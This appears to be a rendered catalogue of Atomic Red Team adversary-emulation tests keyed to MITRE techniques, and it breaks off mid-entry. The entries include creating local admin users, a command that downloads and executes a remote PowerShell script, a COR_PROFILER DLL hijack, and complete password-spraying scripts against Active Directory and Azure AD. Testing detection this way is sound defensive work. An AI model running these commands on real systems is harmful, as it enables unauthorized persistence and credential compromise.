<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6657864e-0323-4206-9344-ac9cd7265a4f</li>
<li><strong>name</strong>: Create a new user in a command prompt</li>
<li>
<p><strong>description</strong>: Creates a new user in a command prompt. Upon execution, "The command completed successfully." will be displayed. To verify the
new account, run "net user" in powershell or CMD and observe that there is a new user named "T1136.001_CMD"</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: net user /add "#{username}" "#{password}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: net user /del "#{username}" &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1136.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Username of the user to create', 'type': 'string', 'default': 'T1136.001_CMD'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Password of the user to create', 'type': 'string', 'default': 'T1136.001_CMD!'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: bc8be0ac-475c-4fbf-9b1d-9fffd77afbde</li>
<li><strong>name</strong>: Create a new user in PowerShell</li>
<li>
<p><strong>description</strong>: Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the
new account, run "net user" in powershell or CMD and observe that there is a new user named "T1136.001_PowerShell"</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-LocalUser -Name "#{username}" -NoPassword</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-LocalUser -Name "#{username}" -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1136.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Username of the user to create', 'type': 'string', 'default': 'T1136.001_PowerShell'}</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2170d9b5-bacd-4819-a952-da76dae0815f</li>
<li><strong>name</strong>: Create a new Windows admin user via .NET</li>
<li>
<p><strong>description</strong>: Creates a new admin user in a powershell session without using net.exe</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1136.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 79d57242-bbef-41db-b301-9d01d9f6e817</li>
<li><strong>name</strong>: Registry-free process scope COR_PROFILER</li>
<li><strong>description</strong>: Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (<code>T1574.012x64.dll</code>) executes when the CLR is loaded by PowerShell.</li>
</ul>
<p>Reference: https://redcanary.com/blog/cor_profiler-for-persistence/</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '"#{file_name}"'
POWERSHELL -c 'Start-Sleep 1'</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{file_name}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: $env:COR_ENABLE_PROFILING = 0
$env:COR_PROFILER = ''
$env:COR_PROFILER_PATH = ''</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1574.012</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0512d214-9512-4d22-bde7-f37e058259b3</li>
<li><strong>name</strong>: Remove Network Share PowerShell</li>
<li>
<p><strong>description</strong>: Removes a Network Share utilizing PowerShell</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Remove-SmbShare -Name #{share_name}
Remove-FileShare -Name #{share_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1070.005</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f14d956a-5b6e-4a93-847f-0c415142f07d</li>
<li><strong>name</strong>: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)</li>
<li><strong>description</strong>: Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos</li>
</ul>
<p>Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}</li>
</ul>
<p>$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName</p>
<p>[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)</p>
<p>$DomainUsers | Foreach-Object {
  $user = $_
  $password = '#{password}'</p>
<p>$credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host " [-] Attempting ${password} on account ${user}."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] ${user}:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of password spraying"</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1110.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: {'description': 'single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)', 'type': 'string', 'default': 'P@ssw0rd!'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: {'description': 'Domain FQDN', 'type': 'string', 'default': '$env:UserDnsDomain'}</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a</li>
<li><strong>name</strong>: Password spray all Azure AD users with a single password</li>
<li>
<p><strong>description</strong>: Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
Valid credentials are only needed to fetch the list of Azure AD users.</p>
</li>
<li>
<p><strong>platforms</strong>: ['azure-ad']</p>
</li>
<li><strong>command</strong>: Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword
Connect-AzureAD -Credential $Credential &gt; $null</li>
</ul>
<p>($Users = Get-AzureADUser -All $true) &gt; $null
Disconnect-AzureAD &gt; $null
$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force</p>
<p>$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword
  try {
    Write-Host " [-] Attempting #{password} on account ${user}."
    Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] ${user}:#{password} are valid credentials!<code>r</code>n"
    Disconnect-AzureAD &gt; $null
  } catch {
    Write-Host " [-] ${user}:#{password} invalid credentials.<code>r</code>n"
  }
}
Write-Host "End of password spraying"</p>
<ul>
<li>
<p><strong>prereq_command</strong>: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}</p>
</li>
<li>
